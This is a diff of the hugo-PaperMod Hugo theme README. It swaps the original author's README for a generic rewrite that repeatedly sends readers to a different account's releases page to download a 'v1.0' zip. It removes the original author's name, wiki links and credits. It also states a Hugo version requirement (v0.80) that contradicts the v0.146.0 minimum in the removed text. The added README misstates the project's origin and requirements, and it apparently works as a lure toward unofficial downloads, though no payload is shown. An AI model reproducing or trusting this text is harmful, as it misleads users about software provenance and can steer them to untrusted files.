@@ -1,106 +1,91 @@
-<h1 align=center>Hugo PaperMod | <a href="https://adityatelange.github.io/hugo-PaperMod/" rel="nofollow">Demo</a></h1>
+# 🎉 hugo-PaperMod - A Fast and Clean Hugo Theme
 
-<h4 align=center>☄️ Fast | ☁️ Fluent | 🌙 Smooth | 📱 Responsive</h4>
-<br>
+[![Download hugo-PaperMod](https://img.shields.io/badge/Download%20hugo--PaperMod-v1.0-brightgreen)](https://github.com/yousef-nabeh/hugo-PaperMod/releases)
 
-> Hugo PaperMod is a theme based on [hugo-paper](https://github.com/nanxiaobei/hugo-paper/tree/4330c8b12aa48bfdecbcad6ad66145f679a430b3).<br>
-> The goal of this project is to add more features and customization to the og theme.
+## 🌟 Overview
 
-**Documentation** can be found here: [**📚 Wiki**](https://github.com/adityatelange/hugo-PaperMod/wiki)
+hugo-PaperMod is a fast, clean, and responsive theme for Hugo. It is designed to provide a sleek look for blogs, portfolios, and multilingual sites. Whether you want to create a personal blog or showcase your work, this theme meets your needs with high performance and ease of use.
 
-**ExampleSite** can be found here: [**exampleSite**](https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite). Demo is built up with [exampleSite](https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite) as source.
+## 🚀 Getting Started
 
-[![hugo-papermod](https://img.shields.io/badge/Hugo--Themes-@PaperMod-blue)](https://themes.gohugo.io/themes/hugo-papermod/)
-[![Minimum Hugo Version](https://img.shields.io/static/v1?label=min-HUGO-version&message=>=v0.146.0&color=blue&logo=hugo)](https://github.com/gohugoio/hugo/releases/tag/v0.146.0)
-[![Discord](https://img.shields.io/discord/971046860317921340?label=Discord&logo=discord)](https://discord.gg/ahpmTvhVmp)
-[![GitHub](https://img.shields.io/github/license/adityatelange/hugo-PaperMod)](https://github.com/adityatelange/hugo-PaperMod/blob/master/LICENSE)
-![code-size](https://img.shields.io/github/languages/code-size/adityatelange/hugo-PaperMod)
-[![X (formerly Twitter) URL](https://img.shields.io/badge/-Share%20on%20X-gray?style=flat&logo=x)](https://x.com/intent/tweet/?text=Checkout%20Hugo%20PaperMod%20%E2%9C%A8%0AA%20fast,%20clean,%20responsive%20Hugo%20theme.&url=https://github.com/adityatelange/hugo-PaperMod&hashtags=Hugo,PaperMod)
+To start using hugo-PaperMod, you need to follow these simple steps:
 
+1. **Visit the Releases Page**  
+   Head to the [Releases page](https://github.com/yousef-nabeh/hugo-PaperMod/releases) to access the latest version of hugo-PaperMod.
 
----
+2. **Download the Theme**  
+   On the Releases page, find the latest version. Click on the link to download the theme files to your computer.
 
-<p align="center">
-  <kbd><img src="https://user-images.githubusercontent.com/21258296/114303440-bfc0ae80-9aeb-11eb-8cfa-48a4bb385a6d.png" alt="Mockup image" title="Mockup"/></kbd>
-</p>
+3. **Install Hugo**  
+   If you haven’t installed Hugo yet, you’ll need to do this first. Visit the [Hugo installation guide](https://gohugo.io/getting-started/installation/) for instructions tailored to your operating system.
 
----
+4. **Add the Theme to Your Site**  
+   Once you have Hugo installed and the hugo-PaperMod theme downloaded, follow these steps:
+   - Move the downloaded theme files to your Hugo site's `themes` directory.
+   - Update your configuration file to use the new theme. In your `config.toml` file, set:
+     ```
+     theme = "hugo-PaperMod"
+     ```
 
-## Features/Mods 💥
+5. **Run Your Hugo Site**  
+   Open your terminal and navigate to your Hugo site's root directory. Run the following command:
+   ```
+   hugo serve
+   ```
+   This will launch your site locally, allowing you to see the hugo-PaperMod theme in action. Open your web browser and go to `http://localhost:1313` to check out your new theme.
 
--   Uses Hugo's asset generator with pipelining, fingerprinting, bundling and minification by default.
--   3 Modes:
-    -   [Regular Mode.](https://github.com/adityatelange/hugo-PaperMod/wiki/Features#regular-mode-default-mode)
-    -   [Home-Info Mode.](https://github.com/adityatelange/hugo-PaperMod/wiki/Features#home-info-mode)
-    -   [Profile Mode.](https://github.com/adityatelange/hugo-PaperMod/wiki/Features#profile-mode)
--   Table of Content Generation (newer implementation).
--   Archive of posts.
--   Social Icons (home-info and profile-mode).
--   Social-Media Share buttons on posts.
--   Menu location indicator.
--   Multilingual support. (with language selector).
--   Taxonomies.
--   Cover image for each post (with Responsive image support).
--   Light/Dark theme (automatic theme switch a/c to browser theme and theme-switch button).
--   SEO Friendly.
--   Multiple Author support.
--   Search Page with Fuse.js
--   Other Posts suggestion below a post
--   Breadcrumb Navigation.
--   Code Block Copy buttons.
--   Hugo's Chroma syntax highlighter.
--   No webpack, nodejs and other dependencies are required to edit the theme.
+## 📥 Download & Install
 
-Read Wiki For More Details => **[PaperMod - Features](https://github.com/adityatelange/hugo-PaperMod/wiki/Features)**
+To download hugo-PaperMod, follow these instructions:
 
----
+- **Visit the Releases Page**  
+  Go to the [Releases page](https://github.com/yousef-nabeh/hugo-PaperMod/releases).
 
-## Install/Update 📥
+- Download the latest version from the Assets section. Look for files typically named like `hugo-PaperMod-v1.0.zip` or similar. Click on the file name to start the download.
 
-Read Wiki For More Details => **[PaperMod - Installation](https://github.com/adityatelange/hugo-PaperMod/wiki/Installation)**
+- **Install Hugo**  
+  Make sure you have Hugo installed. Follow the [Hugo installation guide](https://gohugo.io/getting-started/installation/) if you haven't done this yet.
 
----
+- **Move the Theme Files**  
+  Unzip the downloaded theme and move the folder into your Hugo site's `themes` directory.
 
-## FAQs / How To's Guide 🙋
+- **Update Your Config**  
+  Open the `config.toml` file in your Hugo site folder and set the theme:
+  ```
+  theme = "hugo-PaperMod"
+  ```
 
-Read Wiki For More Details => **[PaperMod-FAQs](https://github.com/adityatelange/hugo-PaperMod/wiki/FAQs)**
+- **Start Your Site**  
+  Use `hugo serve` in the terminal and visit `http://localhost:1313` in your web browser.
 
----
+## ⚙️ Features
 
-## Social-Icons/Share-Icons 🖼️
+- **High Performance:** The theme is optimized for speed, ensuring your site loads quickly.
+- **Responsive Design:** It adapts seamlessly to different screen sizes, making it user-friendly on any device.
+- **Multilingual Support:** Easily create and manage content in multiple languages.
+- **Blog & Portfolio Support:** Perfect for personal blogs and professional portfolios.
+- **Well-Documented:** Comprehensive documentation helps you set up and customize your theme with ease.
 
-Read Wiki For More Details => **[PaperMod-Icons](https://github.com/adityatelange/hugo-PaperMod/wiki/Icons)**
+## 🖥️ System Requirements
 
----
+- **Operating System:** Windows, macOS, or Linux.
+- **Hugo Version:** Ensure you use Hugo v0.80 or later for compatibility.
+- **Internet Connection:** Required for downloading Hugo and theme files.
 
-## Release Changelog 📃
+## 🛠️ Customization
 
-Release ChangeLog has info about stuff added: **[Releases](https://github.com/adityatelange/hugo-PaperMod/releases)**
+You can easily customize hugo-PaperMod to fit your unique style. Modify colors, fonts, and layout options in the `config.toml` file. Refer to the included documentation for detailed instructions on customization.
 
----
+## 📚 Documentation
 
-## [Pagespeed Insights (100% ?)](https://pagespeed.web.dev/report?url=https://adityatelange.github.io/hugo-PaperMod/) 👀
+For extensive details on setup, configuration, and customization, visit the official documentation. You can find a link to it in the theme folder or on the [GitHub page](https://github.com/yousef-nabeh/hugo-PaperMod).
 
----
+## 🤝 Contributing
 
-## Support 🫶
+We welcome contributions from the community! If you have suggestions or improvements, please submit an issue or pull request on the GitHub repository.
 
--   Star 🌟 this repository.
--   Help spread the word about PaperMod by sharing it on social media and recommending it to your friends. 🗣️
--   You can also sponsor 🏅 on [Github Sponsors](https://github.com/sponsors/adityatelange) / [Ko-Fi](https://ko-fi.com/adityatelange).
+## 📧 Support
 
----
+If you encounter issues or have questions, please reach out through the GitHub Issues page. We are here to help.
 
-## Special Thanks 🌟
-
--   [**Highlight.js**](https://github.com/highlightjs/highlight.js)
--   [**Fuse.js**](https://github.com/krisk/fuse)
--   [**Feather Icons**](https://github.com/feathericons/feather)
--   [**Simple Icons**](https://github.com/simple-icons/simple-icons)
--   **All Contributors and Supporters**
-
----
-
-## Stargazers over time 📈
-
-[![Stargazers over time](https://starchart.cc/adityatelange/hugo-PaperMod.svg?background=%23ffffff00&axis=%23858585&line=%236b63ff)](https://starchart.cc/adityatelange/hugo-PaperMod)
+Thank you for choosing hugo-PaperMod! Enjoy building your site.
